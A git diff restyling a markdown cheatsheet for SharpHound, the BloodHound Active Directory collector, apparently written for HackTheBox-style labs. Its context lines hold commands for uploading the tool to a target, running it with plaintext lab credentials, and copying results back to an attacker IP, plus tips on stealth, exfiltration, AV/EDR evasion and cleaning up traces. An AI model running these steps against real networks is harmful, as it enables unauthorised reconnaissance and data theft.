@@ -1,13 +1,42 @@
-# 🩸 SharpHound.exe Cheatsheet
+<!-- CYBERPUNK HEADER -->
+<div align="center">
 
-> **Complete guide to using SharpHound for Active Directory enumeration**
+```
+╔══════════════════════════════════════════════════════════════════════════════╗
+║  ███████╗██╗  ██╗ █████╗ ██████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗  ║
+║  ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗██║   ██║████╗  ██║██╔══██╗ ║
+║  ███████╗███████║███████║██████╔╝██████╔╝███████║██║   ██║██║   ██║██╔██╗ ██║██║  ██║ ║
+║  ╚════██║██╔══██║██╔══██║██╔══██╗██╔═══╝ ██╔══██║██║   ██║██║   ██║██║╚██╗██║██║  ██║ ║
+║  ███████║██║  ██║██║  ██║██║  ██║██║     ██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝ ║
+║  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝  ║
+║                                                                              ║
+║                  🩸 [ C# BLOODHOUND COLLECTOR ] 🩸                           ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+```
+
+<!-- BADGES -->
+![Tool](https://img.shields.io/badge/TOOL-SharpHound-red?style=for-the-badge&logo=windows&logoColor=white)
+![Active Directory](https://img.shields.io/badge/ACTIVE_DIRECTORY-0078D4?style=for-the-badge&logo=microsoft&logoColor=white)
+![Enumeration](https://img.shields.io/badge/ENUMERATION-00FF00?style=for-the-badge&logo=hackthebox&logoColor=black)
+
+[![Author](https://img.shields.io/badge/Author-0xNetrunner-00FF00?style=flat-square&logo=github)](https://github.com/00xNetrunner)
+![Category](https://img.shields.io/badge/Category-AD_Recon-purple?style=flat-square)
+![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)
+
+</div>
 
 ---
 
-## 📋 Table of Contents
+> **`[SYSTEM]`** Official BloodHound data collector for Windows environments
+>
+> **`[STATUS]`** Module: `LOADED` | Target: `ACTIVE_DIRECTORY` | Protocol: `LDAP/SMB`
+
+---
+
+## 📋 >_ Table.Of.Contents()
 
 - [Overview](#-overview)
-- [Upload Methods](#-upload-methods-to-target)
+- [Upload Methods to Target](#-upload-methods-to-target)
 - [Basic Usage](#-basic-usage)
 - [Collection Methods](#-collection-methods)
 - [Advanced Options](#-advanced-options)
@@ -19,30 +48,40 @@
 
 ## 🎯 Overview
 
+```
+> Loading module: SharpHound.exe...
+> Initializing AD enumeration engine...
+> Status: READY
+```
+
 **SharpHound** is the official data collector for BloodHound written in C#. It enumerates Active Directory environments to map attack paths and privilege escalation opportunities.
 
-### Key Features
-- ✅ Native Windows execution (no dependencies)
-- ✅ Multiple collection methods
-- ✅ LDAP and API-based enumeration
-- ✅ Stealth and performance options
-- ✅ Outputs ZIP files for BloodHound ingestion
+### ⚡ Key Features
 
-### Important Version Information
+```
+[✓] Native Windows execution (no dependencies)
+[✓] Multiple collection methods
+[✓] LDAP and API-based enumeration
+[✓] Stealth and performance options
+[✓] Outputs ZIP files for BloodHound ingestion
+```
 
-**SharpHound Versions:**
-- **Latest:** Version 2.8.0 (as of November 2025)
-- **Compatibility:** Designed for BloodHound Community Edition (CE)
-- **Download:** Always get the latest from [GitHub Releases](https://github.com/SpecterOps/SharpHound/releases)
-- **Target Framework:** .NET 4.6.2
+### 📦 Version Information
 
-⚠️ **Note:** Make sure your SharpHound version matches your BloodHound version! You can check the compatible version in BloodHound CE's web UI under Settings → Download Collectors.
+| Property | Value |
+|:---------|:------|
+| **Latest Version** | 2.8.0 (as of November 2025) |
+| **Compatibility** | BloodHound Community Edition (CE) |
+| **Download** | [GitHub Releases](https://github.com/SpecterOps/SharpHound/releases) |
+| **Target Framework** | .NET 4.6.2 |
+
+> ⚠️ **`[WARNING]`** Make sure your SharpHound version matches your BloodHound version! Check the compatible version in BloodHound CE's web UI under Settings → Download Collectors.
 
 ---
 
 ## 📤 Upload Methods to Target
 
-### Method 1: SMB Server (impacket-smbserver)
+### 🔧 Method 1: SMB Server (impacket-smbserver)
 
 **On Kali Linux:**
 ```bash
@@ -68,7 +107,7 @@ copy \\10.10.14.5\share\SharpHound.exe .
 
 ---
 
-### Method 2: Python Web Server
+### 🔧 Method 2: Python Web Server
 
 **On Kali Linux:**
 ```bash
@@ -96,7 +135,7 @@ bitsadmin /transfer mydownload /download /priority high http://10.10.14.5:8000/S
 
 ---
 
-### Method 3: WinRM Upload (evil-winrm)
+### 🔧 Method 3: WinRM Upload (evil-winrm)
 
 **Using evil-winrm:**
 ```bash
@@ -115,7 +154,7 @@ upload /path/to/SharpHound.exe
 
 ---
 
-### Method 4: Base64 Encoding (Small Files)
+### 🔧 Method 4: Base64 Encoding (Small Files)
 
 **On Kali Linux:**
 ```bash
@@ -164,7 +203,7 @@ $b64 = "TVqQAAMAAAAEAAAA..." # Your base64 string
 ## 🎯 Collection Methods
 
 | Method | Description | Usage |
-|--------|-------------|-------|
+|:-------|:------------|:------|
 | **All** | Runs all collection methods except LoggedOn | `-c All` |
 | **Default** | Group, LocalAdmin, Session, Trusts | `-c Default` |
 | **DCOnly** | LDAP-only, no computer queries | `-c DCOnly` |
@@ -201,7 +240,7 @@ $b64 = "TVqQAAMAAAAEAAAA..." # Your base64 string
 
 ## ⚙️ Advanced Options
 
-### Domain Controller Specification
+### 🖥️ Domain Controller Specification
 
 ```powershell
 # Specify domain controller by IP
@@ -214,7 +253,7 @@ $b64 = "TVqQAAMAAAAEAAAA..." # Your base64 string
 .\SharpHound.exe -c All -d certified.htb,external.local
 ```
 
-### Authentication Options
+### 🔐 Authentication Options
 
 ```powershell
 # Use LDAP credentials (alternate to current user context)
@@ -229,7 +268,7 @@ runas /user:certified.htb\judith.mader /netonly cmd
 .\SharpHound.exe -c Session --OverrideUserName judith.mader
 ```
 
-### Performance & Stealth
+### 🔒 Performance & Stealth
 
 ```powershell
 # Stealth mode (slower, LDAP-focused, removes noisy methods)
@@ -254,7 +293,7 @@ runas /user:certified.htb\judith.mader /netonly cmd
 .\SharpHound.exe -c All --DisableSigning
 ```
 
-### LDAP Options
+### 🌐 LDAP Options
 
 ```powershell
 # Specify LDAP port (default 389)
@@ -270,7 +309,7 @@ runas /user:certified.htb\judith.mader /netonly cmd
 .\SharpHound.exe -c All --LdapPort 3268
 ```
 
-### Loop Collection
+### 🔄 Loop Collection
 
 ```powershell
 # Loop collection (great for session gathering)
@@ -282,7 +321,7 @@ runas /user:certified.htb\judith.mader /netonly cmd
 .\SharpHound.exe -c Session --Loop --Loopduration 03:00:00 --LoopInterval 00:10:00
 ```
 
-### Exclusions & Filters
+### 🚫 Exclusions & Filters
 
 ```powershell
 # Exclude domain controllers from enumeration
@@ -298,7 +337,7 @@ runas /user:certified.htb\judith.mader /netonly cmd
 .\SharpHound.exe -c All --LdapFilter "(operatingSystem=*Server*)"
 ```
 
-### Output Options
+### 📁 Output Options
 
 ```powershell
 # Prettify JSON output (larger files, more readable)
@@ -365,10 +404,10 @@ upload /path/to/SharpHound.exe
 impacket-wmiexec certified.htb/judith.mader:judith09@10.10.11.41 "C:\Temp\SharpHound.exe -c All"
 ```
 
-### Parameter Mapping
+### 📊 Parameter Mapping
 
 | bloodhound-python | SharpHound.exe | Description |
-|-------------------|----------------|-------------|
+|:------------------|:---------------|:------------|
 | `-c all` | `-c All` or `--CollectionMethods All` | Collection method |
 | `-u judith.mader` | `--LdapUsername judith.mader` | Username (or use current context) |
 | `-p judith09` | `--LdapPassword judith09` | Password (or use current context) |
@@ -380,21 +419,21 @@ impacket-wmiexec certified.htb/judith.mader:judith09@10.10.11.41 "C:\Temp\SharpH
 
 ## 📥 Download Results
 
-### Method 1: SMB Server (Retrieve Files)
+### 🔧 Method 1: SMB Server (Retrieve Files)
 
 ```powershell
 # On Windows, copy results back
 copy 20241127*.zip \\10.10.14.5\share\
 ```
 
-### Method 2: Evil-WinRM Download
+### 🔧 Method 2: Evil-WinRM Download
 
 ```powershell
 # In evil-winrm session
 download C:\Path\To\20241127_BloodHound.zip
 ```
 
-### Method 3: Base64 Encoding (Small ZIP files)
+### 🔧 Method 3: Base64 Encoding (Small ZIP files)
 
 **On Windows:**
 ```powershell
@@ -409,7 +448,7 @@ $b64 | Out-File -Encoding ASCII bloodhound_b64.txt
 base64 -d bloodhound_b64.txt > bloodhound_data.zip
 ```
 
-### Method 4: Python Web Server Upload
+### 🔧 Method 4: Python Web Server Upload
 
 **On Windows (with Python):**
 ```powershell
@@ -494,13 +533,13 @@ wget http://10.10.11.41:8080/20241127_BloodHound.zip
 
 ### Common Errors
 
-**"Could not resolve domain"**
+#### "Could not resolve domain"
 ```powershell
 # Solution: Specify domain controller explicitly
 .\SharpHound.exe -c All -d certified.htb --DomainController 10.10.11.41
 ```
 
-**"Access Denied"**
+#### "Access Denied"
 ```powershell
 # Verify credentials and permissions
 whoami /all
@@ -512,7 +551,7 @@ nltest /dsgetdc:certified.htb
 .\SharpHound.exe -c All --LdapUsername judith.mader --LdapPassword judith09
 ```
 
-**"LDAP connection failed"**
+#### "LDAP connection failed"
 ```powershell
 # Try different LDAP port (Global Catalog)
 .\SharpHound.exe -c All --LdapPort 3268
@@ -527,7 +566,7 @@ nltest /dsgetdc:certified.htb
 .\SharpHound.exe -c All --DisableSigning
 ```
 
-**No output file generated**
+#### No output file generated
 ```powershell
 # Specify output directory with write permissions
 .\SharpHound.exe -c All --OutputDirectory C:\Temp
@@ -536,7 +575,7 @@ nltest /dsgetdc:certified.htb
 # Ensure you have permissions to current directory
 ```
 
-**"Port 445 not open" errors**
+#### "Port 445 not open" errors
 ```powershell
 # Skip port checks (useful in restricted environments)
 .\SharpHound.exe -c All --SkipPortCheck
@@ -572,7 +611,7 @@ Invoke-BloodHound -CollectionMethod All
 SharpHound generates the following files:
 
 | File | Description |
-|------|-------------|
+|:-----|:------------|
 | `YYYYMMDDHHMMSS_BloodHound.zip` | Main output (import to BloodHound) |
 | `YYYYMMDDHHMMSS_computers.json` | Computer objects |
 | `YYYYMMDDHHMMSS_users.json` | User objects |
@@ -596,45 +635,54 @@ bloodhound
 
 ## 🔗 Useful Resources
 
-- **SharpHound GitHub (Official)**: https://github.com/SpecterOps/SharpHound
-- **BloodHound CE Documentation**: https://bloodhound.specterops.io/
-- **SharpHound Flags Reference**: https://bloodhound.specterops.io/collect-data/ce-collection/sharphound-flags
-- **Download SharpHound**: https://github.com/SpecterOps/SharpHound/releases
-- **BloodHound GitHub**: https://github.com/SpecterOps/BloodHound
-- **SpecterOps Blog**: https://posts.specterops.io/ (latest research and updates)
-- **BloodHound Slack**: https://bloodhoundgang.herokuapp.com/ (community support)
+| Resource | URL |
+|:---------|:----|
+| 🔗 SharpHound GitHub (Official) | https://github.com/SpecterOps/SharpHound |
+| 📖 BloodHound CE Documentation | https://bloodhound.specterops.io/ |
+| 📋 SharpHound Flags Reference | https://bloodhound.specterops.io/collect-data/ce-collection/sharphound-flags |
+| 💾 Download SharpHound | https://github.com/SpecterOps/SharpHound/releases |
+| 🐕 BloodHound GitHub | https://github.com/SpecterOps/BloodHound |
+| 📰 SpecterOps Blog | https://posts.specterops.io/ |
+| 💬 BloodHound Slack | https://bloodhoundgang.herokuapp.com/ |
 
 ### Alternative Collectors
-- **RustHound**: Rust-based collector (cross-platform, AV evasion)
-- **AzureHound**: Azure AD/Entra ID collector
-- **SharpHound.ps1**: PowerShell wrapper for in-memory execution
+
+| Tool | Description |
+|:-----|:------------|
+| **RustHound** | Rust-based collector (cross-platform, AV evasion) |
+| **AzureHound** | Azure AD/Entra ID collector |
+| **SharpHound.ps1** | PowerShell wrapper for in-memory execution |
 
 ---
 
 ## 💡 Pro Tips
 
-1. **Always create ZIP files** - Use `--ZipFileName output.zip` for easier exfiltration and import
-2. **Use loop collection for sessions** - Session data changes frequently; loop for better coverage
-3. **Start with Default or All collection** - Get comprehensive data first, then target specific areas
-4. **Check SharpHound version compatibility** - Match SharpHound version to your BloodHound instance
-5. **Use --Stealth for red teams** - Automatically removes noisy collection methods
-6. **Leverage --SearchForest** - Enumerate all domains in forest automatically (requires trust)
-7. **Time your collection wisely** - Run during business hours for more active sessions
-8. **Use LDAPS when possible** - `--SecureLDAP` encrypts LDAP traffic
-9. **Consider AV/EDR detection** - SharpHound is heavily signatured; consider obfuscation
-10. **Clean up after yourself** - Delete SharpHound and output files during operations
-11. **Document your collection** - Note which methods were used and when
-12. **Use --LdapUsername/--LdapPassword** - When you can't use runas or current context
-13. **Combine with other tools** - Use with PowerView, ADRecon, Certify for full coverage
-14. **Review collection methods** - Not all methods are needed; `DCOnly` is great for stealth
+```
+[01] Always create ZIP files - Use --ZipFileName output.zip for easier exfiltration and import
+[02] Use loop collection for sessions - Session data changes frequently; loop for better coverage
+[03] Start with Default or All collection - Get comprehensive data first, then target specific areas
+[04] Check SharpHound version compatibility - Match SharpHound version to your BloodHound instance
+[05] Use --Stealth for red teams - Automatically removes noisy collection methods
+[06] Leverage --SearchForest - Enumerate all domains in forest automatically (requires trust)
+[07] Time your collection wisely - Run during business hours for more active sessions
+[08] Use LDAPS when possible - --SecureLDAP encrypts LDAP traffic
+[09] Consider AV/EDR detection - SharpHound is heavily signatured; consider obfuscation
+[10] Clean up after yourself - Delete SharpHound and output files during operations
+[11] Document your collection - Note which methods were used and when
+[12] Use --LdapUsername/--LdapPassword - When you can't use runas or current context
+[13] Combine with other tools - Use with PowerView, ADRecon, Certify for full coverage
+[14] Review collection methods - Not all methods are needed; DCOnly is great for stealth
+```
 
 ### Advanced Tips
 
-- **Registry-based collection** is noisy - Consider excluding with `--SkipRegistryLoggedOn`
-- **Computer file lists** work great - Use `--ComputerFile` to target specific systems
-- **Global Catalog port (3268)** can sometimes bypass restrictions
-- **TrackComputerCalls** helps identify connectivity issues
-- **RandomFilenames** can help avoid simple file-based detections
+```
+[→] Registry-based collection is noisy - Consider excluding with --SkipRegistryLoggedOn
+[→] Computer file lists work great - Use --ComputerFile to target specific systems
+[→] Global Catalog port (3268) can sometimes bypass restrictions
+[→] TrackComputerCalls helps identify connectivity issues
+[→] RandomFilenames can help avoid simple file-based detections
+```
 
 ---
 
@@ -658,5 +706,33 @@ Get-Process | Where-Object {$_.ProcessName -like "*sharp*"}
 
 ---
 
-**Created by NetRunner | For Ethical Hacking & Penetration Testing** 🎓🔐
+<div align="center">
 
+## 👤 >_ Author.Info()
+
+```
+╔══════════════════════════════════════════════════════════════╗
+║                     [ NETRUNNER PROFILE ]                    ║
+╠══════════════════════════════════════════════════════════════╣
+║  HANDLE      :  0xNetrunner                                  ║
+║  CLASS       :  4th Year Ethical Hacking Student             ║
+║  SPECIALTY   :  Active Directory | Penetration Testing       ║
+║  STATUS      :  Active                                       ║
+╚══════════════════════════════════════════════════════════════╝
+```
+
+[![GitHub](https://img.shields.io/badge/GitHub-0xNetrunner-181717?style=for-the-badge&logo=github)](https://github.com/00xNetrunner)
+
+---
+
+```
+╔═══════════════════════════════════════════════════════════════╗
+║                  [ END OF TRANSMISSION ]                      ║
+║                    HACK THE PLANET! 🌐                        ║
+╚═══════════════════════════════════════════════════════════════╝
+```
+
+![SharpHound](https://img.shields.io/badge/TOOL-SharpHound-red?style=flat-square)
+![BloodHound](https://img.shields.io/badge/COLLECTOR-BloodHound-blue?style=flat-square)
+
+</div>
